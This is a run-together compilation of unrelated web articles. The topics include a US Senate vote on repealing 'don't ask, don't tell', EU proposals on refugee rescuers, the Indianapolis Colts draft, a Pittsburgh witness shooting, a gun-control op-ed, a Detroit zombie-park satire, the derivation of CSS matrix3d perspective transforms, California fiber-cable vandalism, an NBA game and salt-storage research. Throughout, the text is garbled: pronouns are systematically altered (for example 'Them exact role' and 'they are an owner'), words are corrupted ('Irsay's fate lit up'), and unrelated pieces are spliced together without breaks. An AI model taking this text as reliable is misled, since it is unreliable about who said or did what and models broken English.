Before Thursday's vote, Reid complained that all 42 of the GOP senators have pledged to block action on any measure before the chamber deals with extending Bush-era tax cuts and authorizing government spending for the rest of the fiscal year.
The Democratic strategy appeared to be to try to persuade Collins to vote for opening debate on the measure so that the two other Republicans who also have expressed support for a repeal -- Brown and Murkowski -- also might do so. Murkowski announced their support for a repeal in a statement Wednesday.
Democrats were pushing for action now because the new Congress in January brings a Republican-controlled House and a diminished Democratic majority in the Senate, which will make repealing "don't ask, don't tell" more difficult.
Collins said Wednesday they had asked Reid to delay the vote until after the Senate completes work on the package of tax measures negotiated by the White House and congressional leaders, which Republicans consider a top priority in the final weeks of the lame-duck session that ends in early January.
They also wanted Reid to schedule sufficient time to debate the defense authorization bill that contains the "don't ask, don't tell" repeal measure.
Both Reid and Collins, in their comments on the Senate floor Thursday, acknowledged an agreement for the debate to include up to 15 amendments -- 10 by Republicans and five by Democrats. However, Reid appeared to oppose the request to wait until the tax package had been passed.
Obama has been calling senators in both parties to urge their support, White House Press Secretary Robert Gibbs said. Before Thursday's vote, Gibbs told reporters that congressional repeal of "don't ask, don't tell" was the best way forward, and they believed it could happen before the end of the year.
Obama has called for repealing "don't ask, don't tell" after years of debate on the policy that detractors consider discriminatory. More than 400 military personnel were discharged under the policy in 2009, and a federal judge ruled it unconstitutional in a case that is under appeal.
Defense Secretary Robert Gates and Joint Chiefs of Staff Chairman Adm. Mike Mullen both have urged Congress to vote for a repeal. The measure before the Senate, which has already gained approval in the House, contains a process for implementing the change that requires certification from the president, the defense secretary and the Joint Chiefs chairperson.
Gates has warned that court challenges to "don't ask, don't tell" could force an immediate repeal of the policy, rather than the process in the legislation that would allow the military to manage the change on a longer timetable.

A European Commission report, detailing a plan to criminalize volunteers rescuing refugees from drowning, has been revealed by UK civil liberties group Statewatch. The EU is desperate and is therefore making bad decisions, the group's director told Sputnik.
Statewatch, a London-based civil rights watchdog, has published a confidential report by the European Commission, which reveals the plans of the Council of the European Union to pass a new law, criminalizing volunteers who rescue refugees, stranded off the coast of Greece, from drowning.
The new proposals would penalize NGO's, local people and volunteers — all providing humanitarian assistance to refugees arriving in the EU – and would remove their exemption from being considered people smugglers.
"The EU has failed, they're desperate. They're trying to take over operations [in Greece] to take control of everything," Tony Bunyan told Sputnik.
"I've been doing this for 25 years and have never seen anything like it. The EU is in a complete mess. They failed to respond quickly to what happened last spring. The volunteers and smaller NGOs have been helping refugees since the crisis began. Where was the EU then? They only tuned up in November [2015] and by that time already 700,000 people had landed in Greece."

The Council of the European Union is presenting its conclusions and laying down policy guidelines for the European Commission to follow. According to Mr Bunyan, these conclusions are non-binding, and give member states the power to act on the Council's recommendations and on how to interpret criminalizing humanitarian assistance by civil society, locals and volunteers.
This means member states have the power to decide for themselves whether to criminalize those who are aiding refugees.
"There are ten countries in Europe that are exempt from this and where offering humanitarian assistance is not an offense. There are also ten others where facilitating 'staying' isn't an offence either," Mr Bunyan said.
"Before it was illegal for buses and taxis to transport refugees in Greece, but they changed the law in July [2015] and now private individuals can give refugees a lift."
Smuggling and Trafficking
The EU Council's proposals to criminalize volunteers rescuing refugees from drowning also aim to protect those arriving by sea from people smugglers and human traffickers – or so they say.
"Refugees will continue to rely on smugglers to reach Europe via Greece unless the EU comes up with a viable alternative for them." — Youth For Humanity (@YFHumanity) February 3, 2016​
According to Mr Bunyan, however, there is a well-known distinction between "smuggling" and "trafficking".
"There is an important difference between trafficking and smuggling. The International Organization for Migration (IOM) explains it on their site. What's happening in the EU with the refugee crisis is predominantly people smuggling."
"Sure there are human trafficking rings exploiting refugees arriving in Europe, but when a migrant gets on a boat they make a deal to be smuggled into a country, disembark and that's the end of that relationship. Human trafficking is different – migrants don't consent to it. The difference is very important," Mr Bunyan told Sputnik.

The document published by Statewatch also reveals EU's plans to create a state-run agency that would force NGOs and their members to register with the police.
"It's a toxic mix. The EU state wants to take over all operations. Frontex [EU's border agency] will be extended and they will work with the national border guard, but this means that everything local will come under their control. Today, Frontex in Greece has to obey both EU and local Greek law. The new law will mean that the national Greek border guard will have to obey the EU."
Making Life Difficult for NGOs
The EU Council's proposals would also require NGOs and its members to register, incorporating them into state structures.
"They want NGOs and their members to hand over all their personal information and names. Can you imagine? NGOs don't have to do that. It's an outrage."

Local councils have also been making life difficult for NGOs working in Greece. Some have even threatened refugee shelters.
"Councils are making life for smaller NGOs extremely difficult. One council threatened to shut down the Hope Centre, a refugee shelter in Lesvos. And only last week, their medical tent was burned down. I'm not saying the two are connected or that the council is responsible but it just shows you that there are some bad people in the area," Mr Bunyan told Sputnik.

And the situation is only deteriorating.
"Greece has given into the EU — because it has all the money. It's also threatened to kick it out of the Schengen. They are only letting refugees from Syria, Iraq and Afghanistan pass through the Greek-Macedonian border… but that's the first hurdle. These people then want to go to Germany and Austria.
"There is an invisible wall which is coming down and a certain number of people are going north, and there is another invisible wall, in the sea by Greece and Turkey, which is being put up by the EU."
The European Union has struggled to deal with the refugee crisis as people began fleeing war-torn countries in the Middle East and North Africa, and arriving on European shores in their thousands. Greece – being one of the initial entry points for those desperately seeking to get away from conflict – has borne the brunt of the influx of migrants.

A total of 856,723 refugees arrived in Europe by sea in 2015, whilst 67,413 people came by boat in the last two months alone.
"Civil society needs to get organized, and the EU needs to differentiate between 'smugglers' and 'human traffickers' and stop criminalizing volunteers," Mr Bunyan told Sputnik.

INDIANAPOLIS – Not long after they put to bed their 21st NFL draft as owner of the Indianapolis Colts, Jim Irsay, dressed in the only manner Jim Irsay dresses — that'd be a slick, dark suit— pulled up a folding chair inside their team facility and mused aloud on the current and complex state of their football team.
 They are an owner wrestling with their incessant need to win now, this instant, this year, and the sobering reality before him: Their team isn't equipped to do that, and they know it. These Colts, as currently constructed, aren't ready to win now, certainly not ready to win big.
Too many holes. Too much youth. Too much uncertainty.

“You have to be willing to put up sometimes with having the patience, sometimes, to slow down and make sure we're going to build this right,” Irsay was saying one minute.
Then Andrew Luck popped in their head, and Irsay was saying this: “We're going to go after it, like, ‘Hey, we have a chance to do something special this year...'
“It's hard being patient, I tell ya,” they added.

Insider: Colts double down on defense in NFL draft
Meet Marlon Mack: Colts RB of the future?
Yet Irsay remains mindful of the mistakes that led their football team to back-to-back 8-8 seasons and a spot on the couch each of the two previous two Januarys. Too many free-agent busts, too many draft whiffs, too much win now and not enough long-term vision. Those blunders stagnated this once-ascending team. The Colts went from one game shy of Super Bowl XLIX in January 2015 to third place in the AFC South in January 2017. Ouch.
The defense wasn't just bad, it was old.
Thus all the change. Irsay's newly hired general manager, Chris Ballard, went to work over the weekend, spending six of eight draft picks on that side of the ball. The aim, Ballard has explained, is to inundate their roster with competition. That breeds progress. Eventually, that breeds winning.
This will take time, Ballard has stressed once, twice, a dozen times since taking over in January. Give them time. There's no instant coffee in the NFL, they like to say.
“My feeling is that he's going to be around for a while,” Irsay said, effusive in their praise of their new general manager.
“He has a lot of tendencies that remind me of Bill Polian,” Irsay said, comparing Ballard to the Hall of Fame executive. “He has some that don't remind me of Bill, which is also good,” they added before a hearty laugh.
Moments later, Irsay's fate lit up at the mere mention of their star quarterback. Ballard mentioned earlier in the day that Luck — who is currently recovering from surgery on their throwing shoulder in January — is “starting to get good motion in their arm” — and Irsay didn't seem particularly worried about Luck's status for the regular season, which kicks off Sept. 10 in Los Angeles against the Rams.
“I just wish — and I think our fans know — (but) I can't emphasize enough how Andrew's leadership skills and their passion to win a world championship, how much that means to him,” Irsay said. “It's their focus, it's what their life is based around. And that's exciting. And we're trying to get that on defense. And we need leaders on defense.”
“My feeling is that he's going to be around for a while,” Irsay said of new GM Chris Ballard. (Photo: Matt Kryger/IndyStar)
The team's defensive struggles from 2016 clearly still irritate Irsay. There was the collapse in Week 1 against Detroit, in Week 6 in Houston, in Week 16 in Oakland. Blown chances: It became that team's broken record.
And it's what kept them out of the playoffs.
“The opening game last year speaks for itself,” Irsay said, still fuming. “You score 35 points at home and you can't win the game? That's a problem.”
It's why Ballard took an ax to the defense this spring, cutting or not re-signing six critical pieces in an ambitious effort to start anew. The headliner this weekend started just 13 games in college before the Colts grabbed them in the first round Thursday night, but Irsay, like Ballard and coach Chuck Pagano, earnestly believes the Colts got a special one in Malik Hooker.
“There's no question that defensively we have to become good enough to finish games, good enough to win games,” Irsay said. “I don't think right now we're talking about the Colts being a defensive team that's going to go in and dominate.”
No, Jim, nobody's talking like that. The Colts were 30th in football last year in total defense.

But the gradual build, followed by the long-term payoff, is the creed Irsay has professed more than once this offseason. They want no flash-in the-pan Super Bowl run; they want a string of them. For Irsay, it's about reaching the mountaintop and staying there.

It goes back to their biggest regret of the Peyton Manning era: a dozen years of dazzling seasons and just one world championship.
“I'd rather win two Lombardi (trophies) and endure several losing seasons than have one Lombardi and be in the playoffs every single year and never have a losing season for 10 years or what have you,” Irsay said. “It's about greatness. It's about world championships.”
Central to that is the continued development of the unit that has given Irsay constant headaches and Luck constant beatings. Irsay sees growth in their offensive line, and for the first time in years, there is ample evidence: The Colts yielded 31 sacks during the season's first eight games and only 13 over the final eight.
Former general manager Ryan Grigson spent half their draft haul last spring — four of eight picks — on offensive linemen. The payoff could come in the years to come.
“That offensive line is a lot better than people think,” Irsay said. “That offensive line, particularly if it can stay healthy, and we can get a five that's consistently playing together, that is going to become a strength. Not, ‘Well, it's OK, it's decent enough, let Andrew do their work.' No. It's going to become a strength. I see that there. Not only with the five starters but when I look at the seven, I look at depth.
In the end, so much comes down to Luck. Irsay's star is entering the sixth year of their career. It's time to start competing for world championships — or at least get back on the right track.
“I think he's really going into that sweet spot area,” Irsay said of Luck. “I've talked before about Peyton (Manning) not winning their first playoff game until six years in. I think that we have an excellent chance to be scoring high 20s or even low 30s a game. I want to see us run the ball like I think we can.
“Look, we're going into this thinking, ‘Hey, we're not sure how good we can be, but we sure are looking to be playing in January.' That's our hope and I don't think that's unrealistic at all.”
Time will tell. Another January sitting at home for the Colts? Hasn't happened since 1994. Jim Irsay remembers. They were the team's general manager back then.

PITTSBURGH (KDKA) – It's been several days now and still no arrest in the shooting death of a female witness in a federal drug case.
The woman was ambushed and gunned down near the Hill District.
She's the second local witness to be killed in recent months.
We wanted to know if there's anything that can be done to protect these witnesses and it appears the answers is, it depends.
“We call it witness relocation,” said Allegheny County Police Supt. Charles Moffatt.
But more people would call it witness protection. It isn't that program you see on your favorite crime show, where a witness is in protective custody until they have to testify.
Witness relocation operates a bit differently here than on TV.
“We move the person or persons from an area where they live to another area maybe in Western Pennsylvania, or maybe in Allegheny County,” said Moffatt.
Tina Crawford, 34, of the Upper Hill, was reportedly preparing to meet with prosecutors handling the case of a Mt. Washington-based drug operation. Crawford was gunned down Friday and their mother, Patsy, was seriously injured. Them exact role in this is unclear.
“I can not comment on any specific case,” said Pennsylvania Attorney General Kathleen Kane. “We try to make sure people are safe, whether they are on the street, whether they're witnesses, no matter what.”
But cases like Crawford's — or that of 15-year-old Leroy Powell, a key witness in a Duquesne homicide who was gunned down days after they testified at a preliminary hearing – raised new questions on protection for witnesses who do come forward.
“They have to be willing participants to go into this program,” said Moffatt. “As you well know, we can not make a person go into the relocation program.”
On March 31, 1968 in Washington, D.C., Dr. Martin Luther King Jr. preached, "It is no longer a choice, my friends, between violence and nonviolence. It is either nonviolence or nonexistence." Four days later they were assassinated. Individuals have recently claimed that Dr. King was prophetic about gun control. It's not prophecy, but rather in 45 years our culture has not changed. Opponents of gun control legislation are fond of saying, "guns don't kill people; people kill people." Wayne LaPierre of the NRA has blamed the media for promoting gun violence. While it does, in most cases, take a person to hold, aim, and shoot a gun, let me offer this information:
"Dr. King died as a result of a single gunshot wound caused by a bullet that entered the right side of the face approximately an inch to the right and a half inch below the mouth. The bullet fractured Dr. King's jaw, exited the lower part of the face and reentered the body in the neck area. It then severed numerous vital arteries and fractured the spine in several places, causing severe damage to the spinal column and coming to rest on the left side of the back."
People don't do this. They don't fracture jaws, sever arteries, fracture spines, and stop hearts within a matter of seconds or minutes. Perhaps some people are capable of committing some of these crimes with their bare hands. But they can't do nearly as much damage in such a short amount of time without the power of a gun. This is a power that -- without being confined to "a well-regulated Militia," as the Second Amendment directs -- should be removed from the hands of the people entirely.
Last year I went to a shooting range for the first time and I'll admit, in that controlled environment, it was fun. I realized shortly after, however, that "fun," is not the point. If guns are available for recreational use, they're available for killing. Recreation shouldn't be pitted against someone's right to live. Neither should the conservative adage of less government interference in private affairs. Twenty six- and seven-year-olds were killed in a matter of minutes at Sandy Hook Elementary School in December. It's not "fun" anymore, and it hasn't been for a long time. Guns end lives. And they destroy the existence of those who are left alive.
The Framers of the Constitution could never have imagined the number of lives stolen due to gun violence. Of the three countries that include a right to bear arms in their constitutions -- the United States, Guatemala, and Mexico -- only the U.S. Constitution does not include any restrictions. This wasn't a major problem until the 1980s, when the country began to interpret the Second Amendment as a right to bear arms for self-defense (even though data from a study in the 1990s shows that for every instance in which a gun in the home was shot in self-defense, there were "seven criminal assaults or homicides, four accidental shootings, and 11 attempted or successful suicides"). In the past, the Second Amendment was largely unnecessary because states regulated the use of guns. In fact, when the U.S. Supreme Court struck down D.C.'s handgun ban in 2008, it was the first time the court had ever restricted gun regulation (albeit by a 5-4 vote) on the grounds that the Second Amendment protects an individual right to bear arms.*
There's a reason we have constitutional amendments. Let's use the next one to save lives instead of crossing our fingers for extended background checks. As Joshua Horwitz, executive director of the Coalition to Stop Gun Violence explains, "We want a vote on the issues, we don't want them watered down so they're unrecognizable. If [legislators] can't vote for it, let the American people judge them on that."
How is expanding background checks -- which the NRA is fiercely lobbying against and the Senate has yet to agree upon -- and giving $10 million more a year to fund school safety a suitable solution when held against the life of even one child? Senator Chuck Schumer (D-NY) calls background checks the "sweet spot" for gun control legislation. I don't see how this legislation, if it makes it through the Senate let alone the House, is nearly enough, let alone the "sweet spot." Even the banning of assault weapons and high capacity ammunition magazines, which were instrumental in the Sandy Hook shooting, won't make it into law and don't solve the problem of handguns that contribute to the death toll daily.
We are talking about a problem of fatalities -- one momentary action that can end someone's existence. The parents of Ana Grace Marquez-Greene, one of the children killed at Sandy Hook Elementary, are left wondering for as long as they live what Ana Grace could have been had they lived. In a recent column they ask, "how many [of the thousands of children lost each year to gun violence] might have grown up to cure a disease, write a symphony, or be the next Dr. King?" In an effort to reach a compromise on some kind of gun control legislation, rather than no legislation at all, many Democratic members of Congress and other gun control advocates aren't reacting appropriately to the stakes. Is the issue of government interference, fear of the NRA, or the possibility of a tedious Republican filibuster really as important as a life?
Republicans have already threatened to make ample use of the filibuster. Marco Rubio (R-FL) Rand Paul (R-KY), Mike Lee (R-UT), and Ted Cruz (R-TX) are going to talk on the Senate floor until their tongues swell. John McCain (R-AZ) is against such a filibuster, despite their lack of support for gun control legislation. The dialogue needs to be had, they reason, before asking, "What are we afraid of?" We need to speak for the 2,000+ victims of gun violence since Sandy Hook. We need to speak for those from Aurora, Tucson, Virginia Tech, Columbine, and the many less-publicized victims of gun violence, for whom we will never be able to mourn.
The NRA argues that background checks are useless because criminals ignore them. I'm not inclined to believe this, given LaPierre's flair for fabrication, but it does bring up a relevant point. No matter how we amend gun legislation, we cannot keep guns solely in the hands of public safety officials. Expanded background checks won't change that. They won't change much at all. People are not recognizing how high the stakes are. To the Senate, I say,
"Welcome back from vacation. Every day you wait to deliberate and vote on gun control legislation is another day more people die. Every day you waste time debating expanded background checks is another day you ignore President Obama's push for a renewed ban on assault rifles and limits on high-capacity-ammunition magazines. And every day you don't consider the incredibly high stakes of your decisions, or lack thereof, is another day you ignore the life-saving option of eliminating guns as an option for recreation, self-defense, livelihood, or murder."
In their final sermon the day before they were shot in Tennessee, Dr. King revealed, "Like anybody, I would like to live a long life. Longevity has its place. But I'm not concerned about that now. I just want to do God's will." Let's not deprive one more child of the happiness, hardship, lessons, and chance to bring something new to the world that they deserve. I hope that by the time I have children, I no longer have to fear taking them to school one day and never seeing them again because their lives were stolen by a gun.
In these tough times for Detroit neighborhoods we are all about creative solutions. We're also all about fun fun fun in the form of theme parks. So Z World Detroit, the proposal to make a zombie theme park in a blighted neighborhood, is just so genius we might need three of them. Not convinced? Well the crack team of researchers has Data Driven Detroit figures, a crowd-sourcing-style fundraising campaign and they say things like "this is not about complaining Detroit, it is about doing something about it." So clearly they have figured out the formula for Detroit success. (Though a tweet from the Mayor might be needed to get all the way to the $145,000 Goal. Who knew zombies were so expensive!)
If there is one thing Detroiters love, it is running. Sure, Michigan is a "fat state" but let's not forget all that great cardio to be had "running for your life" between trips to our plethora of burger joints and BBQ places. According to Z World, at the theme park you will be
chased down by Zombies, chased through the streets, you'll be running for your life hiding out in buildings, looking for supplies and trying to establish a base. This sounds a lot like all that fun we had during the 1960s race riots. It is nice to know that Z Land is finally going to capitalize on our love of adrenaline rushes and nostalgia. Now even visitors from the 'burbs can "wonder if they will make it through the night." And new Detroiters that missed "rock bottom" can pay to have a more terrifying version of the city re-created. (No word on those admission fees yet but someone had better make sure they know to include a Coney Dog stand.) So we're totally convinced but if you are not ready to hit the donate button yet to ensure that at least one Detroit hood is warmed with the sounds of screaming at all hours, here's a bit more of the pitch and the five-minute video plan.

Police in Brazil are hunting a soccer referee who reportedly stabbed a player to death during a dispute over a foul call.
The fight broke out during a soccer match in the city of Barreira on Sunday afternoon when Jose Ramos da Silva, 28, protested a foul against their team. After a heated argument, the referee, identified as 26-year-old Francisco Edio Gregorio Chaves, pulled out a knife and stabbed da Silva in the chest, Momento24.com reported.
Da Silva's brother, 24-year-old Francisco das Chagas da Silva, was stabbed four times in the back when they tried to intervene in the fight, but their injuries were not considered life-threatening.
Da Silva died at the scene before they could be treated by doctors, the Marca newspaper reported.
Police are now searching for Chaves, who fled after the attack.

I was cleaning out some old notes from my previous job and found some math scribbles for computing CSS transforms and thought I would share it. For some context, I was working on a page which had an image that looked like this:
I wanted to add an Easter egg where I could use the screens of those devices to display arbitrary things. I thought it would just be a simple matter of pixel pushing with translate/rotate/scale/etc using CSS transforms but couldn't really get things to line up perfectly.
Frustrated, I started trying to solve it analytically instead. That means for any given shape, I need to solve for the perspective transform that warps an element into that shape. Once that is solved, it is easy to write a WYSIWYG helper script for outputting the CSS. Here's the final result:
See the Pen ifnqH by Franklin Ta (@fta) on CodePen.
See the coffeescript tab for the code. Or paste this gist into console to try it out on any page that has jQuery. You will need to change the selector to whatever element you want to add the dots to.
Using that you can drag things into whatever (convex quadrilateral) shape you want:
Blah blah blah blah blah Blah blah blah blah blah
I ended up not using this for anything but hope someone else will find it useful!
The rest of this post will explain how to derive the equation for the transform since I remember not being able to find much about it back then. Looking at the code you will see that the core logic is just a few lines to set up and solve a system of linear equations. We will now see how to derive that system.
So let's say we have the 4 corners of the element we want to transform, \((x_i, y_i)\) where \(i \in {0, 1, 2, 3}\) and we want to map each \((x_i, y_i)\) to some \((u_i, v_i)\). From the docs of matrix3d, the transform we want is a homogeneous matrix so we have to represent each point using homogeneous coordinates. In homogenous coordinates, a point \((x, y)\) is represented by \((k x, k y, k)\) for any \(k
eq 0\). For example \((3, 2, 1)\) and \((6, 4, 2)\) both represent the point \((3, 2)\).
Thus the transformation matrix \(H\) that we want to solve for must satisfy
$$
\underbrace{
\begin{pmatrix}
h_0 & h_1 & h_2 \\
h_3 & h_4 & h_5 \\
h_6 & h_7 & h_8 \\
\end{pmatrix}
}_{H}
\begin{pmatrix}
x_i \\
y_i \\
1 \\
\end{pmatrix}
= k_i
\begin{pmatrix}
u_i \\
v_i \\
1 \\
\end{pmatrix}
$$
for each \(i\), where the knowns are \(x_i, y_i, u_i, v_i\).
Notice that the \(H\) that can satisfy this is not unique. For example you can scale \(H\) by some constant and the resulting matrix will still map the points correctly (since you can also scale the \(k_i\) by the same amount and still represent the same homogeneous point). So assuming \(h_8
eq 0\) (see footnote ), we should always be able to scale both sides until \(h_8 = 1\), which will simplify the problem for us a little bit:
$$
\begin{pmatrix}
h_0 & h_1 & h_2 \\
h_3 & h_4 & h_5 \\
h_6 & h_7 & 1 \\
\end{pmatrix}
\begin{pmatrix}
x_i \\
y_i \\
1 \\
\end{pmatrix}
= k_i
\begin{pmatrix}
u_i \\
v_i \\
1 \\
\end{pmatrix}
$$
Now we should try to get it into a form that we can solve. Multiplying out we get:
$$
\begin{align*}
x_i h_0 + y_i h_1 + h_2 & = k_i u_i \\
x_i h_3 + y_i h_4 + h_5 & = k_i v_i \\
x_i h_6 + y_i h_7 + 1 & = k_i \\
\end{align*}
$$
We can get rid of \(k_i\) by substituting it from the third into the first two equations:
$$
\begin{align*}
x_i h_0 + y_i h_1 + h_2 & = u_i x_i h_6 + u_i y_i h_7 + u_i \\
x_i h_3 + y_i h_4 + h_5 & = v_i x_i h_6 + v_i y_i h_7 + v_i \\
\end{align*}
$$
Remember we are trying to solve for \(h_i\) so we should try to separate them out:
$$
\begin{array}{rcccl}
x_i h_0 + y_i h_1 + h_2 & & - u_i x_i h_6 - u_i y_i h_7 = u_i \\
& x_i h_3 + y_i h_4 + h_5 & - v_i x_i h_6 - v_i y_i h_7 = v_i \\
\end{array}
$$
Which in matrix notation is:
$$
\begin{pmatrix}
x_i & y_i & 1 & 0 & 0 & 0 & -u_i x_i & -u_i y_i \\
0 & 0 & 0 & x_i & y_i & 1 & -v_i x_i & -v_i y_i \\
\end{pmatrix}
\begin{pmatrix}
h_0 \\
h_1 \\
h_2 \\
h_3 \\
h_4 \\
h_5 \\
h_6 \\
h_7 \\
\end{pmatrix} = \begin{pmatrix}
u_i \\
v_i \\
\end{pmatrix}
$$
Since we have 4 of these mappings we can write them like this:
$$
\begin{pmatrix}
x_0 & y_0 & 1 & 0 & 0 & 0 & -u_0 x_0 & -u_0 y_0 \\
0 & 0 & 0 & x_0 & y_0 & 1 & -v_0 x_0 & -v_0 y_0 \\
x_1 & y_1 & 1 & 0 & 0 & 0 & -u_1 x_1 & -u_1 y_1 \\
0 & 0 & 0 & x_1 & y_1 & 1 & -v_1 x_1 & -v_1 y_1 \\
x_2 & y_2 & 1 & 0 & 0 & 0 & -u_2 x_2 & -u_2 y_2 \\
0 & 0 & 0 & x_2 & y_2 & 1 & -v_2 x_2 & -v_2 y_2 \\
x_3 & y_3 & 1 & 0 & 0 & 0 & -u_3 x_3 & -u_3 y_3 \\
0 & 0 & 0 & x_3 & y_3 & 1 & -v_3 x_3 & -v_3 y_3 \\
\end{pmatrix}
\begin{pmatrix}
h_0 \\
h_1 \\
h_2 \\
h_3 \\
h_4 \\
h_5 \\
h_6 \\
h_7 \\
\end{pmatrix} = \begin{pmatrix}
u_0 \\
v_0 \\
u_1 \\
v_1 \\
u_2 \\
v_2 \\
u_3 \\
v_3 \\
\end{pmatrix}
$$
At this point we are done because it is in \(Ah = b\) form so we can just throw this at a matrix algebra library to solve for \(h\). It should spit back out the \(h_i\) which will let us recover the transform we want:
$$
H =
\begin{pmatrix}
h_0 & h_1 & h_2 \\
h_3 & h_4 & h_5 \\
h_6 & h_7 & h_8 \\
\end{pmatrix}
$$
One last wrinkle is that matrix3d actually takes in a 4 by 4 matrix rather than a 3 by 3. Since we don't care about \(z\) values (because all our points are on the same plane, \(z=0\)) we can just make \(z\) map back to itself. Like so:
\[
\begin{pmatrix}
h_0 & h_1 & 0 & h_2 \\
h_3 & h_4 & 0 & h_5 \\
0 & 0 & 1 & 0 \\
h_6 & h_7 & 0 & h_8 \\
\end{pmatrix}
\]
And that's the final matrix you use for matrix3d. Remember to specify it in column major order and also set the transform-origin to whatever you measured your points with respect to.
I didn't know what to google when I first did this so I had to derive this by hand. I have recently been reading a book on computer vision and it turns out this problem is actually a basic problem in that field (see getPerspectiveTransform in opencv) and the technique for solving this is called direct linear transformation.
EDIT (2016-11-09): As mentioned by Alexander in the comments, matrix3d used to be incorrect on Chrome under page zoom. I contributed a fix to chromium so it should be fine now.
Vandals snipped another fiber optic cable line in the San Francisco Bay area this week, the 12th incident of its kind in the region over the past year.
The latest attack occurred in the San Joaquin Valley town of Stockton, disrupting Internet, mobile phone, and 911 service for tens of thousands of AT&T and Verizon customers in three counties east of San Francisco. Service was restored about a day after the Tuesday incident.
The FBI, which is investigating the attacks, has not stated a motive, but it said the attacks usually occur in remote areas where there are no surveillance cameras. The initial attacks on California telecommunications lines began in July 2014. Whoever is responsible appears, for the moment, to be operating with impunity.
AT&T said in a statement that the damage occurred to "1,200 feet of a fiber run that required 192 pairs of fiber to be re-fused. That's a ton of capacity. So this was a major trunk and 1,200 feet of it was damaged."
The cable is about as thick as a finger and is encased in a hard, flexible conduit. The FBI said that whoever is responsible may appear as telecom maintenance workers or "possess tools consistent with that job role."
MIAMI -- Bradley Beal knew in the wee hours of Monday morning, when their cell phone buzzed with a text message soon after the Washington Wizards' team flight arrived in town.
They knew John Wall was going to be defiant.
Editor's Picks Wall's 26 points helps Wizards past Heat, 114-103 John Wall scored 26 points one night after leaving a game with a sore knee, and the Washington Wizards beat the Miami Heat 114-103 on Monday night.
When Beal saw their teammate crumble to the floor in the final minute of Sunday's home loss to Dallas after they collided knees with a Mavericks player, Beal figured there was no chance Wall would be available to board a flight, let alone travel to play a game 24 hours later.
Then came that text message.
"When you look at an injury like that, it's like, 'Ugh,'" Beal said of Wall, who initially refused to look at MRI results Sunday night in Washington. "But he's a warrior. He's a soldier at the end of the day. I knew they would be back when we were texting. Knowing him, I knew they would be hardheaded and play."
A day after they were carried off the court, Wall returned the favor to lift their teammates with 10 of their game-high 26 points in the fourth quarter to lead the shorthanded Wizards to a 114-103 win over the Miami Heat. Although Beal knew about Wall's intentions to play, the All-Star point guard's status was officially in question until starting lineups were submitted about 30 minutes before the game.
But even then, Wall later said they aren't absolutely certain they wouldn't play until after they warmed up with the team and regained enough confidence in the knee in the pregame layup line. Sunday's MRI revealed no structural damage, but Wall was diagnosed with a bruised right knee.

"I did a good job of getting a lot of treatment and just doing what I have to do to prepare myself," said Wall, who played 38 minutes, shot 9-of-13 from the field, had seven assists and didn't commit a turnover in the second half. "Getting up [Monday] morning, before the breakfast meeting, and getting treatment -- that's basically what I was on all day: treatment, treatment, treatment."
The Wizards (9-10) could hardly afford to be without Wall these days. Injuries and attrition have contributed to Washington owning one of the league's worst defenses this season. Seven of the Wizards' 10 losses have come by double figures and on Monday they were without centers Marcin Gortat (personal reasons), Nene Hilario (calf strain) and Drew Gooden (calf strain).
By equal parts necessity and strategy, Washington has shifted to a small-ball lineup that features as many as four guards and so-called center Jared Dudley, who is 6-foot-7. With Wall setting the pace, the Wizards shot 50 percent from the field overall and the same from 3-point range against a Heat team that ranked second in the league in defensive efficiency.
Basically, Wizards coach Randy Wittman dictated the personnel and pace of the game.
"They probably had us in more cross-matches, miscommunications, than we've had all season," Heat coach Erik Spoelstra said. "Even before that, it just felt that they were [speeding] downhill most of the game and we couldn't flatten them out to get them to an uphill game."
And that was with Wall driving on a bad wheel and consistently setting up Beal and Gary Neal, who each added 21 points and were among six Wizards players to score in double figures. Washington attempted 92 shots and finished with 23 assists.
After the initial scare from seeing Wall go down the previous night, Wittman said they were quickly reminded of how tough their floor leader has been throughout their career. Last season, Wall played in the playoffs with five fractured bones in their left hand and wrist.
"He's one of the toughest guys I've coached," Wittman said. "It takes a lot for them to miss a game. As we said, last year in the playoffs, it took five broken bones before they would sit out a game."
"I'm probably one of the toughest people you'll see. I can't say unless it's broken I won't play, because I've done that before." John Wall
Wall insists there's an increased urgency with the Wizards, who entered the season among teams considered a legitimate threat to unseat Cleveland as defending Eastern Conference champions. Their threshold for pain has always been high.
"It was kind of like an injury I had before, and I got hit on it again so it was numb," Wall said of their knee.
It would have been completely understood -- and probably recommended -- for Wall to either skip the trip or sit out the second night of a back-to-back set coming off a disappointing home loss.
So why push it?
"I'm probably one of the toughest people you'll see," said Wall, who has averaged 26.4 points, 9.0 assists, 4.6 rebounds and 3.4 steals the past six games. "I can't say unless it's broken I won't play, because I've done that before. We've been in a drought and we're so close to putting something together. When I step up and play well, this team is better and that's what I've been doing lately -- giving our team a chance to win."
Wall then walked out of the arena wearing a designer jacket styled with a cape on the back.
Not many players can execute that kind of fashion statement.
The only statement more impressive was the physical one Wall made in a span of 24 hours.
Skin and immune system influence salt storage and regulate blood pressure
High blood pressure is responsible for many cardiovascular diseases that are the leading cause of death in industrialized countries. High salt intake has long been considered a risk factor, but not every type of high blood pressure is associated with high salt intake. This has puzzled scientists for a long time. However, new findings by Professor Jens Titze (Vanderbilt University, Nashville, Tennessee, USA and the University of Erlangen) now point to previously unknown mechanisms. Accordingly, the skin and the immune system play an important role in the regulation of the sodium balance and hypertension, as they reported at the 1st ECRC "Franz-Volhard" Symposium of the Max Delbrück Center for Molecular Medicine (MDC) Berlin-Buch and Charité -- Universitätsmedizin Berlin on September 7, 2012 in Berlin-Buch.
The water and salt balance of the body is of great importance for blood pressure. The decisive factor is the kidney, which regulates how much water is retained in the body and how much is excreted. In this way it regulates the volume of blood and thus influences blood pressure. However, new findings by Professor Titze, one of the leading experts in the field, show that organs and systems of the body that hitherto were not associated with water and salt balance have an influence on blood pressure: the skin and the immune system.
Professor Titze showed that sodium can be stored in the connective tissue of the skin. "The sodium concentration can be higher in the skin than in blood. This means that not only the kidney regulates sodium balance but that there must be additional mechanisms," the researcher explained. Their research group demonstrated that the immune system plays an important role in this mechanism: A specific type of immune cells, the macrophages -- literally "big eaters" in Greek -- recognize high sodium levels in the skin. They subsequently activate a gene that in turn ensures that the vascular endothelial growth factor (VEGF-C) is released in large amounts into the skin. VEGF-C controls the growth of lymphatic vessels that transport fluid and sodium. If this factor is released in higher amounts, lymphatic vessels grow into the skin and ensure that the stored sodium can be transported away again.
In animal experiments Professor Titze's research team blocked this mechanism. As a result, the rats and mice in the experiment developed high blood pressure. "The immune cells apparently regulate salt balance and blood pressure," Professor Titze said. "In addition, data from a first clinical study showed that large amounts of salt are stored in the skin of patients with high blood pressure."
